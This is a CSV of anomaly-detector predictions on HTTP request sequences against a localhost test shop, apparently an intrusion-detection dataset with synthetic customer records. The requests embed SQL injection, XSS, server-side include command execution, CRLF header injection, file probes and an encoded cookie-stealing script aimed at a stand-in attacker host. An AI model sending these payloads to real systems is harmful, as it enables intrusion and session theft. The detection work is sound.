data,y_pred,y_test
"puthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=absi&password=primogenitura&nombre=sem&apellidos=bettini&email=phillott@g-audio.cf&dni=88374981b&direccion=calle+zubia+7+&ciudad=gar�noain&cp=10189&provincia=lleida&ntc=0957957573117060&b1=registrar gethttp://localhost:8080/mtatbls.nsf gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chandras&pwd=h+olgona&remember=?&b1=entrar gethttp://localhost:8080/webapp/examples/showcfg posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=blak?*emor&password=anf6_9ti�4915&nombre=sharim&apellidos=grino+crosas&email=santacroce_prueckner@puravidasa.bn&dni=68875056s&direccion=c/+padre+presentat,+26+&ciudad=torremanzanas/torre+de+les+ma�anes,+la&cp=31750&provincia=�vila&ntc=7191364141648176&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precioa=39&cantidad=0&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=warun&password=paloteo&nombre=regis&apellidosa=deudor+ortodo&email=salvador@bijoubijoudiferente.ec&dni=09115235j&direccion=calle+corregeria,+134,+&ciudad=santa+maria+d'ol�&cp=18518&provincia=palencia&ntc=9339123760594436&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alain&password=-57s5g03&nombre=sigrid&apellidos=aranzadi+henkel&email=cliff5@fichajes.nom.ms&dni=61093505p&direccion=mo�as+s/n,+&ciudad=sax&cp=22255&provincia=madrid&ntc=1364126817729617&b1=+ gethttp://localhost:8080/6909030637832563290.jsp",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8158&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=+ gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=beate&password=l�brega&nombre=fiona&apellidos=aguilar+sanz&email=glassberg@professionalhosting.com.tf&dni=a238'308z&direccion=carrer+castell+84,+&ciudad=peque&cp=06177&provincia=m�laga&ntc=2283238465616456&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&password=mane79&nombre=lihuen&apellidos=bibiloni+urdi&email=brion@baybay.gi&dni=00508069e&direccion=gerona+89+&ciudad=olocau+del+rey&cp=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&provincia=valladolid&ntc=2304911329453006&b1=registrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ver?d*?i&password=ran7�n&nombre=jairo&apellidos=uruburu+ayensa&email=coffer@soyvalenciano.bu&dni=19782082n&direccion=pe�a+dorada+87,+1?f&ciudad=valfarta&cp=09660&provincia=girona&ntc=1025019984542981&b1=registrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=destry&password=26semble&nombre=wenceslao&apellidos=machado+labarca&email=pasqual@stockdefotos.tel&dni=80999708x&direccion=pla�a+de++montserrat+roca+i+bal*ta,+19*9+3-e&ciudad=cubillo+de+uceda,+el&cp=43151&provincia=teruel&ntc=0708219176163620&b1=registrar gethttp://localhost:8080.old posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=6867&b1=confirmar gethttp://localhost:8080/tienda1/asf-logo-wide.gif gethttp://localhost:8080/servlet/helloworldservlet",anomalous,anomalous
"gethttp://localhost:8080/asf-logo-wide.java posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=85&cantidad=90&b1a=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=85/&cantidad=11&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kassissi&password=chamizo&nombre=reese&apellidos=g-iuli*vo+ra,mallo&email=shale-rozsival1@ssextremadura.sm&dni=52920037g&direccion=c/+juan+de+zoyas+50,+1?h&ciudad=villafranca&cp=36450&provincia=teruel&ntc=5175598912871065&b1=registrar gethttp://localhost:8080/cfide/administrator/homefile.cfm gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=sainsbur&password=austrida&nombre=deifilia&apellidos=benedetti+lozana&email=haddrick_cleary@esposa.com.mobi&dni=80061275t&direccion=plza.+garcia+alvarez+de+albornoz,+146+&ciudad=alc�zares,+los&cp=41540&provincia=tarragona&ntc=0932460116452279&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%2b gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=pagi&pwd=refr2nd0&remember=off&b1=entrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brosso&password=mist66l&nombre=adolfina&apellidos=olalla+padoan&email=pedrucho_mikkelborg@demasiado.com.co&dni=69829332k&direccion=arnau+d'oms,+2+&ciudad=morella&cp=50546&provinciaa=toledo&ntc=6446879002828554&b1=registrar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org gethttp://localhost:8080/tienda1/publico/anadir.jsp?ida=1&nombre=jam�n+ib�rico&precio=100&cantidad=5&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=85/&cantidad=37&b1=a�adir+al+carrito gethttp://localhost:8080/scripts/tools/newdsn.exe gethttp://localhost:8080/tienda1/asf-logo-wide.gif/ gethttp://localhost:8080/asf-logo-wide.java posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7285&b1=confirmar/ gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n'+ib�ric-'o&precio=39&cantidad=4&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lrcrtp&password=a9oma39e&nombre=angelo&apellidos=merinas&email=ramo@whitehat.py&dni=17048909k&direccion=rafael+orozco+141+12?h&ciudad=valga��n&cp=02141&provinciaa=huesca&ntc=1343607497132758&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=farah&password=!filatelia&nombre=cayetano&apellidos=mesquida+carrasco&email=kaynak@campodegolf.com.sc&dni=86164975y&direccion=calle+pellejero+villoria,+184+11?b&ciudad=viveros&cpa=21870&provincia=c�rdoba&ntc=1552564007403755&b1=registrar gethttp://localhost:8080/iissamples/sdk/asp/database/limitrows_vbscript.asp gethttp://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=catlin&pwd=v76c088ra&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2158&b1=pasar+por+caja/ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kolahi45&password=o5$57t4&nombre=segismundo&apellidos=torr�&email=unkel-richler@nanogenerador.bu&dnia=62093064x&direccion=calle+puerto+oncala,+80,+7?g&ciudad=almazul&cp=20495&provincia=navarra&ntc=9824241120494731&b1=registrar gethttp://localhost:8080/tienda1/publico~ gethttp://localhost:8080/tienda1/miembros/editar.jsp.bak gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=spight&pwd=aj1quecars0&remember=off&b1=entrar gethttp://localhost:8080/tienda1/imagenes/logo.gif/",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=9111&b1=confirmar gethttp://localhost:8080/_vti_bin/ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=edik3&pwd=a6mi9a2&remember=on/&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2727&b1a=confirmar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=azzuolo&pwda=atrabiliario&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/anadir.jsp~ gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cathleen&password=5sc0za&nombre=edilma&apellidos=malaver+vaz&email=tillman.clarke-smith7@7horas.cl&dni=b71b937835e&direccion=plza.+alvaro+de+bazan,+49+1g&ciudad=villaescusa+de+roa&cp=09274&provincia=�vila&ntc=3695729312300949&b1=registrar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6851&b1=confirmar+ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=betty-an5&password=mo9qu0ado&nombre=petunia&apellidos=ivern&emaila=veazie-bolin@tiaherminia.tj&dni=32245892f&direccion=calle+luis+piernas+86+11-e&ciudad=gerindote&cp=46443&provincia=almer�a&ntc=8173244424971818&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&passworda=libreta&nombre=virtudes&apellidos=t�rtola+planelles&email=arnold-weck@santcugatpisos.gl&dni=75272191e&direccion=calle+san+mambru,+60+&ciudad=guijo+de+coria&cp=23391&provincia=salamanca&ntc=7881123538069057&b1=registrar gethttp://localhost:8080/tienda1~ posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=euysoo&password=m7n�fica&nombre=tarciano&apellidos=donnadieu+vivanco&email=dombasle@tagarautomation.ad&dni=30585356w&direccion=calle+santo+domingo+savio+174+13-b&ciudad=jubrique&cp=49325&provincia=badajoz&ntc=9595137071003174&b1=registrar gethttp://localhost:8080/tienda1/publico/6909030637832563290.jsp posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vicheara&password=59r,5/68a&nombre=yilda&apellidos=rafi+guisset&email=ferrold@kimkardashian.com.gq&dni=89168818a&direccion=pasaje+ensenada,+100,+13?b&ciudad=figueruela+de+arriba&cp=40540&provincia=madrid&ntc=0275568897070170&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vester1&password=exudar&nombre=ignacia&apellidos=mimendi+calvaroso&email=emperio@chinavende.gt&dni=79531407y&direccion=o'donnell+9+&ciudad=cabana+de+berganti�os&cp=21110&provincia=barcelona&ntc=290553531661419&b1=registrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chihhua&password=iri4ar&nombre=hebert&apellidos=fonts+westermeier&email=hemmings_vos@programasalquilermaquinaria.ag&dnia=55492932g&direccion=c/+bazan+184+4?a&ciudad=garcia&cp=10812&provincia=soria&ntc=2183980302594165&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dokken8&pwd=parlanch�n&remember=off/&b1=entrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=maxin&pwd=5at5s&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=toshach&pwd=quer4n55a&remember=off/&b1=entrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=arcouet&password=man17lme73e&nombre=landelina&apellidos=dangla+llobera&email=grimaud@vi�avilano.bu&dni=17030732z&direccion=calle+santa+maria,+38,+9a&ciudad=santa+gadea+del+cid&cp=08560&provincia=palencia&ntc=5358171636012894&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=','0');waitfor+delay+'0:0:15';--&precio=8384&b1=confirmar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=helem&password=aparecer&nombre=pancho&apellidos=goldaratz+brizuela&email=lahbib_hodo@silver-knights.ie&dni=54489862x|&direccion=berlin+116+&ciudad=sudanell&cp=24346&provincia=burgos&ntc=3191456339688389&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=adebayo&pwd=pedral&remember=off&b1a=entrar gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/6909030637832563290.jsp gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar|&precio=7044&b1=pasar+por+caja gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=vino+rioja&precio=100&cantidad=65&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melonie&password=ad1168n77&nombre=dulio&apellidos=ubach+rodr�guez&email=wilmot@schnaps.com.ne&dni=87584326g&direccion=c/+lara,+162+&ciudad=villanueva+de+campe�n&cp=01423&provinciaa=barcelona&ntc=5124736256894307&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja""><!--#exec+cmd=""dir+""--><&precio=85&cantidad=90&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectassessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stanly&password=fundida&nombre=florencio&apellidos=angl�s+ors&email=macnicol@vilano.cl&dni=94288893w&direccion=c/+murillo,+25+&ciudad=villanueva+de+cameros&cp=+&provincia=le�n&ntc=2518528858482826&b1=registrar gethttp://localhost:8080/asf-logo-wide.inc posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dana&password=ibe2io&nombre=tiago&apellidos=burunat+jaraba&email=klyaro@hostrofessional.com.kg&dni=26315307h&direccion=plza.+del+ingenier+o+orueta+,*+77,+7b&ciudad=plasenzuela&cp=40194&provincia=albacete&ntc=2227850098385549&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727 gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=<!--#exec+cmd=""ls+/""-->&password=3749s63a&nombre=avito&apellidos=zalarich+llufriu&email=saul@expertmagnet.np&dni=14335839p&direccion=c/+barranquet+130+&ciudad=calzada+de+los+molinos&cp=50470&provincia=a+coru�a&ntc=9270239658811052&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=1408&b1=confirmar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=balwinde&pwd=nac�reo&remember=off&b1a=entrar gethttp://localhost:8080/cfide/administrator/header.cfm gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=belrango&password=guapote&nombre=alexia&apellidos=serracana+abt&email=vertes@gesmahernan.mq&dni=06928607bh&direccion=calle+jamaica+189+4?h&ciudad=belmonte+de+miranda&cp=46417&provincia=ja�n&ntc=9385688686005345&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sheraton&password=d�m9d01&nombre=selenia&apellidos=vi�as+batle&email=tiger@risiberia.eu&dni=05265898w&direccion=plaza+san+nicola+s,+7,+8?g&ciudad=arafo&cp=09300&provincia=zamora&ntc=9475523758342240&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=espinosa&pwda=candado&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bhasin&password=desondra&nombrea=saiguen&apellidos=pedercini+borda&email=mims@hojadecalculo.com.ae&dni=36868779d&direccion=soria+32,+3?e&ciudad=arroyomolinos+de+la+vera&cp=10883&provincia=segovia&ntc=6892387186647118&b1=registrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8588&b1=confirmar/ gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cad'y&pwd=af73o76fad8&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5151paros%22%20style=%22background:url(javascript:alert('paros'))&b1=confirmar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=thisner9&pwd=tanganillas&remember=off&b1=entrar gethttp://localhost:8080/tienda1/miembros/editar.jsp/.old gethttp://localhost:8080/admin5.nsf posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=','0');waitfor+delay+'0:0:15';--&login=damien&password=cerc4&nombre=nicodemo&apellidos=chiri&email=borg@conoceagelespa�a.py&dni=96284579r&direccion=calle+isaac+albeniz,+23+&ciudad=arenal,+el&cp=42132&provincia=alicante&ntc=8673222014088073&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=5021&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=finnegan&password=c978ca&nombre=mailena&apellidos=spellmann+calafat&email=henshaw-irish@ladigianni.ar&dni=+&direccion=c/+aurora,+129+&ciudad=santa+mar�a+del+campo&cp=02290&provincia=soria&ntc=8611196070656706&b1=registrar gethttp://localhost:8080.bak gethttp://localhost:8080/tienda1/4861362529278789730 posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9457&b1=confirmar/ gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=');waitfor+delay+'0:0:15';-- posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=mcgee&password=ab*rigadero&nombre=salom�n&apellidos=castany+bigorra&email=karapiet@novaservicios.gr&dni=02030491m&direccion=mantua+35,+&ciudad=instinci�n&cp=28512&provincia=navarra&ntc=1541713650880969&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/4861362529278789730.bak gethttp://localhost:8080/tienda1/imagenes/3.gif/6909030637832563290.jsp.old gethttp://localhost:8080/tienda1/miembros.old gethttp://localhost:8080/asf-logo-wide.gif/.bak gethttp://localhost:8080/tienda1.old posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9044&b1a=confirmar gethttp://localhost:8080/_private/ puthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=100&cantidad=97&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=zadow&passworda=alternaci-59&nombre=gyana&apellidos=farell+lattuf&email=bushell@sayuela.uk&dni=23485919k&direccion=c/+juan+ii,+108+12?c&ciudad=inviernas,+las&cp=37428&provincia=tarragona&ntc=0299500452895556&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcready&pwd=9l/1a29/n&remember=on&b1=entrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/imagenes/3.gif.bak posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jakeman&password=c0a428o&nombrea=carolina&apellidos=pepiol+acho&email=juergens-shear@imarbella.dm&dni=13717151c&direccion=vicent+andreu+estelles,+106+1?e&ciudad=mata+de+los+olmos,+la&cp=20217&provincia=girona&ntc=5088681295774264&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ca,the&pwd=zaparda&remember=off&b1=entrar gethttp://localhost:8080/msadc/msadcs.dll gethttp://localhost:8080/mail.box posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=854&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precioa=39&cantidad=40&b1=a�adir+al+carrito puthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lysinger&password=d9sor9an21a2or&nombre=giovana&apellidos=planelles+neris&email=measor.barezewska@enlanzarote.com.gq&dni=54498003d&direccion=c/+fuensanta+41+&ciudad=sangarr�n&cp=32650&provincia=huesca&ntc=5070328292613697&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kalwarow3&password=gram�nea&nombre=atico&apellidos=planells+teixid�&email=csikos@newcosl.gr&dni=52594102w&direccion=calle+arcediano+lopez+cabezas,+184,+3?e&ciudad=b�rchules&cp=37405&provincia=valladolid&ntc=?&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/global/estilos.css/ gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bulanda&password=co3tri�ir&nombre=beatriz&apellidos=calvet+ibars&email=binney8@telogis.lb&dnia=39498492v&direccion=calle+atico+noguerol+192,+7e&ciudad=elduain&cp=22190&provincia=toledo&ntc=1924133576102581&b1=registrar gethttp://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.gif/ gethttp://localhost:8080/tienda1/imagenes/1.gif.inc gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%0aset-cookie%3a+tamper%3d1041264011025374727 posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3817&b1=%20 posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rayna&password=sa5di-3&nombre=rolando&apellidos=corzo&email=mueller@x2.com.gh&dni=15491128f&direccion=calle+granate,+21,+&ciudad=lahiguera&cp=0335a&provincia=santa+cruz+de+tenerife&ntc=2289103302521090&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=deek&password=denunciadora&nombrea=salina&apellidos=gir�n+cece�as&email=un-hi@tarifasdevuelos.et&dni=55199080t&direccion=tecla+sala+74+&ciudad=castrillo+de+villavega&cp=18818&provincia=m�laga&ntc=7068244348344945&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=rasmira&apellidos=pavi�+pool&email=gloves@sms24h.mk&dni=92795576y&direccion=calle+jose+luis+de+arrese,+105+1?f&ciudad=ger&cp=24370&provincia=cantabria&ntca=7563981891605435&b1=registrar gethttp://localhost:8080/tienda1/miembros/salir.jsp/ gethttp://localhost:8080/samples/htmlsamp/styles.htm posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mc&pwd=cerverano&remember=on&b1a=entrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=caton&password=enco4osa&nombre=lauro&apellidos=santamaria+molt�&email=chady@buscamoto.fi'+and+'1'='1&dni=27243677q&direccion=calle+llibertat+10,+&ciudad=alberic&cp=10610&provincia=guadalajara&ntc=1870284741408418&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=r,uyan?'t&pwd=entremeter&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidada=98&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=@40",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&precio=100&cantidad=97&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/global/creditos.jsp/.inc gethttp://localhost:8080/iissamples/sdk/asp/docs/toolbar.asp gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1764&b1=confirmar/ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jenni&password=ps+i8ol�gico&nombre=daisi&apellidos=saavedra+aldeta&email=erbd.matache@elsentidodelavida.vg&dni=53897959n&direccion=travesa+de+teo+155+&ciudad=villan�a&cp=50213&provincia=castell�n&ntc=177592453128726&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1/&nombre=queso+manchego&precio=100&cantidad=76&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/asf-logo-wide~ gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&password=tel�grafo&nombre=alexia&apellidos=de+castro+w�lker&email=jans@voragolive.do&dni=63653644v&direccion=sanlucar+la+mayor,+148,+&ciudad=atzeneta+del+maestrat&cp=16270&provincia=ciudad+real&ntc=5906206602610899&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/index.jsp.old posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tobye&password=car40m20ci8&nombre=amaro&apellidos=brunori&email=esham@cpanelweb.com.bv&dni=22205546n&direccion=avda.+aldehuela,+9+13-h&ciudada=torlengua&cp=02510&provincia=palencia&ntc=5917432990420378&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gib&password=3l29stre'or'a='a&nombre=yarav�&apellidos=pa�ella+villasev&email=switzer@grandesinventos.pt&dni=04831932t&direccion=c/+rio+san+lorenzo,+125,+10?c&ciudad=alegr�a-dulantzi&cp=34170&provincia=zamora&ntc=3029147558638309&b1=registrar gethttp://localhost:8080/_vti_log/ gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1+ gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%3f gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tat7&password=p0on57cia008nto&nombre=camelia&apellidos=zurita+santander&email=diessl-claver@tradedeficit.mz&dni=59059811c&direccion=artes,+s/n+&ciudad=escobar+de+polendos&cp=18518&provincia=burgos&ntc=2636619315022095&b1=registrar""><!--#exec+cmd=""dir+""-->< posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=virk&password=latrin5&nombre=roxana&apellidos=barbero+delgados&email=bonpart@produc@tosgarantizados.@ag&dni=91059337z&direccion=c/+llucena,+193+2h&ciudad=almu��car&cp=43248&provincia=barcelona&ntc=6935592091774249&b1=registrar posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=any%0aset-cookie%3a+tamper%3d1041264011025374727 gethttp://localhost:8080/tienda1/miembros/fotos.jsp/asf-logo-wide.gif.old",anomalous,anomalous
